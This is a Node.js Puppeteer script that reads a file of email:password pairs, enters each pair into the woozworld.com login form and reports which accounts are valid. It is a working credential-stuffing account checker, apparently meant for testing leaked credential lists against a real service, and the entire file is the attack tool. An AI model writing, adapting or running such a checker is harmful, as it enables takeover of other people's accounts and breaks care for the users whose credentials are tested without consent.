//Dependencies
const Puppeteer = require("puppeteer")
const Request = require("request")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Functions
async function Main(accounts){
    const browser = await Puppeteer.launch({ defaultViewport: null, headless: false, args: ["--no-sandbox", "--disable-setuid-sandbox"] })
    const page = await browser.newPage()

    await page.goto("https://www.woozworld.com/", { waitUntil: "domcontentloaded" })
    
    var account_index = 0

    Checker()
    async function Checker(){
        if(accounts.length == account_index){
            console.log("Finished checking.")
            await browser.close()
            process.exit()
        }

        const account = accounts[account_index]

        await page.evaluate(()=>{
            document.querySelector("#forms--login > div:nth-of-type(1) > input[type=text]:nth-of-type(1)").value = ""
            document.querySelector("#forms--login > div:nth-of-type(1) > input[type=password]:nth-of-type(2)").value = ""
        })

        await page.type("#forms--login > div:nth-of-type(1) > input[type=text]:nth-of-type(1)", account.split(":")[0])
        await page.type("#forms--login > div:nth-of-type(1) > input[type=password]:nth-of-type(2)", account.split(":")[1])
        await page.click("#forms--login > div:nth-of-type(1) > input.sign-in-button")

        const g = await page.evaluate(()=>{
            const SI = setInterval(function(){
                const waitfor = document.getElementsByClassName("messg messg-error")

                if(waitfor != undefined && waitfor != ""){
                    clearInterval(SI)

                    return waitfor
                }
            }, 1000)
        })

        await page.waitForTimeout(1000)
        const page_content = await page.content()

        console.log(page_content.indexOf("Incorrect email and/or password."))
        if(page_content.indexOf("Incorrect email and/or password.") != -1){
            console.log(`Invalid account ${account}`)
        }else{
            console.log(`Valid account ${account}`)
        }

        account_index += 1
        Checker()
        return
    }
}

//Main
if(!Self_Args.length){
    console.log("node index.js <input>")
    process.exit()
}

if(!Fs.existsSync(Self_Args[0])){
    console.log("Invalid input.")
    process.exit()
}

const Accounts = Fs.readFileSync(Self_Args[0], "utf8").split("\n")

if(!Accounts){
    console.log("File is empty.")
    process.exit()
}

console.log(`${Accounts.length} accounts found.`)
Main(Accounts)
